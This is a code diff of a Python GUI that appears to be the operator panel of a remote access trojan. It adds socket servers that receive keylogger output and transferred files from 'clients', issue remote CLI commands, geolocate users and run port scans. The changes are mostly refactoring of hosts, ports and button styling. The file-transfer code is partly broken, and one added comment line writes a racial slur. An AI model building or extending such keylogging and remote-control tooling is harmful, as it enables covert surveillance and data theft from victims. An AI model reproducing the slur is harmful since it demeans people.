@@ -10,9 +10,22 @@ import os
 
 
 class App(customtkinter.CTk):
-    SERVER_SOCKETS= []
-    CLIENT_IP= []
-    USER_GEOLOCATIONS= []
+    # Important lists
+    SERVER_SOCKETS = []
+    CLIENT_IP = []
+    USER_GEOLOCATIONS = []
+
+    # Socket IP adresses and PORTS
+    filename_transfer_SOIP = "127.0.0.2"
+    filename_transfer_SOPORT = "65433"
+    file_transfer_SOIP = "127.0.0.4"
+    file_transfer_SOPORT = "1930"
+    cli_SOIP = "127.0.0.1"
+    cli_SOPORT = "12345"
+    keylog_SOIP = "127.0.0.89"
+    keylog_SOPORT = "65230"
+
+    # Important Strings
     sep = ":***:"
 
     def __init__(self):
@@ -54,16 +67,27 @@ class App(customtkinter.CTk):
         self.frame1.grid(row=0, column=0, sticky="w", padx=10)
         
         # Buttons
-        self.button = customtkinter.CTkButton(master=self.frame1, text="Killswitch", command=self.killswitch)
+        self.button = customtkinter.CTkButton(master=self.frame1, 
+                                            text="Killswitch",
+                                            bg_color="red", 
+                                            fg_color="black",
+                                            hover_color="red",
+                                            command=self.killswitch)
         self.button.grid(row=0, column=0, pady =10,sticky="n", padx=10)
       
-        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startPortScan, text="Port Scan")
+        self.button = customtkinter.CTkButton(master=self.frame1, 
+                                            command=self.startPortScan, 
+                                            text="Port Scan")
         self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
 
-        self.button = customtkinter.CTkButton(master=self.frame1, command=self.openMapLevel,text="Geolocation")
+        self.button = customtkinter.CTkButton(master=self.frame1, 
+                                            command=self.openMapLevel,
+                                            text="Geolocation")
         self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)     
 
-        self.button = customtkinter.CTkButton(master=self.frame1, command=self.showFiles,text="Files")
+        self.button = customtkinter.CTkButton(master=self.frame1, 
+                                            command=self.showFiles,
+                                            text="Files")
         self.button.grid(row=3, column=0, pady =10, sticky="n", padx=10)
 
         self.button = customtkinter.CTkButton(master=self.frame1, command=lambda: self.showClientList(self.CLIENT_IP), text="Show Clients")
@@ -85,7 +109,7 @@ class App(customtkinter.CTk):
                                corner_radius=10)
         self.entry.grid(row=2, column=1, sticky="s")
 
-        self.button = customtkinter.CTkButton(master=self.frame2,height=25, command=self.send_to_client,text="Submit")
+        self.button = customtkinter.CTkButton(master=self.frame2,height=25,fg_color="green", command=self.send_to_client,text="Submit")
         self.button.grid(row=2, column=2,padx = 10, sticky="nw")
         
         ###########################################################################################
@@ -99,8 +123,8 @@ class App(customtkinter.CTk):
             print("Server started the keylog socket.")
 
         def createKeylogSocket():
-            HOST = "127.0.0.89"  # Standard loopback interface address (localhost)
-            PORT = 65230  # Port to listen on (non-privileged ports are > 1023)
+            HOST = self.keylog_SOIP  # Standard loopback interface address (localhost)
+            PORT = self.keylog_SOPORT  # Port to listen on (non-privileged ports are > 1023)
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 # Add the server socket to a list
                 self.SERVER_SOCKETS.append(s)
@@ -130,8 +154,8 @@ class App(customtkinter.CTk):
             print("DICT_TRANSFER: Server started.")
 
         def create_file_name_socket():
-            HOST = "127.0.0.2"  # Standard loopback interface address (localhost)
-            PORT = 65433  # Port to listen on (non-privileged ports are > 1023)
+            HOST = self.filename_transfer_SOIP  # Standard loopback interface address (localhost)
+            PORT = self.filename_transfer_SOPORT  # Port to listen on (non-privileged ports are > 1023)
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 # Add the server socket to a list
                 self.SERVER_SOCKETS.append(s)
@@ -155,8 +179,8 @@ class App(customtkinter.CTk):
             print("FILE_TRANSFER: Server started.")
 
         def create_file_transfer_socket():
-            HOST = "127.0.0.4"
-            PORT = 1930
+            HOST = self.file_transfer_SOIP
+            PORT = self.file_transfer_SOPORT
 
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 # Make a top Level progress bar  
@@ -180,14 +204,19 @@ class App(customtkinter.CTk):
                         # TODO Make the recv wait untill all 77 bytes are recieved                
                         while len(msg) < msg_size:
                             msg = conn.recv(77).decode("utf-8") # ! 64b(File bytes) + 13b(HEADER) 
-                            print(f"{len(msg)}, {msg}\n")
+                            #print(f"{len(msg)}, {msg}\n")
 
                         msg = msg.replace(" ","")
                         if msg:
-                            #print(msg)
+                            
                             try:
                                 cmd = msg.split(f"{self.sep}")[0]
                                 data = msg.split(f"{self.sep}")[1]
+                                if msg ==  "FINISH:***:Completed": 
+                                    print(msg)
+                                    print(cmd)
+                                    print(data)
+                                
                                 #data = "".join()
                             except Exception as e: 
                                 print(f"\nCMD:{cmd}")
@@ -199,37 +228,31 @@ class App(customtkinter.CTk):
                                     print(f"\nCreated TXT file: {msg}")
                                     new_file = open(f"Files/{data}", "w")
                                     textbox.insert("0.0", f"{msg}\n")
-                                    msg = ""
+                                    cmd = ""
 
                                 case "TXT_DATA":
                                     #print(f"\nWriting to TXT file: {data}")
                                     filesize = int(data)
                                     while True:
-                                        msg = conn.recv(64)
-                                        if filesize < 0:
-                                            print("Broken the loop")
-                                            time.sleep(5)
+                                        msg = conn.recv(64).decode("utf-8")
+                                        if filesize < 0 and "::END_OF_THE_SOCKET::" in msg: 
+                                            cmd = ""
+                                            msg = ""
+                                            print("Recieved the Trailer.")        
                                             break
-                                        if not msg: break 
-                                        new_file.write(data)
+                                        new_file.write(msg)
                                         filesize = filesize-64
+                                        #new_file.write("NIGGA")
                                         print("---------------------")
-                                        print(filesize)
-                                        print(msg)
+                                        print("FILESIZE", filesize)
+                                        print("MSG", msg)
                                         print("---------------------")
-                                        time.sleep(1)
-                                    msg = ""
-                               
+       
                                 case "FINISH":
+                                    print("NIHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
                                     print(f"\nClosing the file: {msg}")
                                     new_file.close()
-                                    msg = ""
-                                
-                                case "CLOSE":
-                                    print(f"\nAt the end of the socket: {msg}")
-                                    #conn.close()
-                                    msg = ""
-                                    #break
+                                    cmd = ""
          
         start_file_name_socket()
         start_file_transfer_socket()
@@ -240,10 +263,12 @@ class App(customtkinter.CTk):
             t3.daemon = True
             t3.start()
 
+
+        # TODO handle rappid disconnection from the client
         def create_CLI_socket():
             global cli
-            HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
-            PORT = 12345  # Port to listen on (non-privileged ports are > 1023)
+            HOST = self.cli_SOIP  # Standard loopback interface address (localhost)
+            PORT = self.cli_SOPORT  # Port to listen on (non-privileged ports are > 1023)
 
             #? This makes sure that we dont loose connection for too long
             def wake_up():
@@ -255,9 +280,9 @@ class App(customtkinter.CTk):
                     wake_tries = 0
                 except Exception as e: print(f"Thrown Exception CLI_Wake_Up: {e}") 
                 
-                #? After 10 minutes of no connection kill the socket
+                #? After 100 minutes of no connection kill the socket
                 wake_tries+=1
-                if wake_tries >= 60:
+                if wake_tries >= 600:
                     print("CLI_Error: Chosen client is offline, terminating socket.")
                     cli.close() 
                     self.SERVER_SOCKETS.remove(cli)
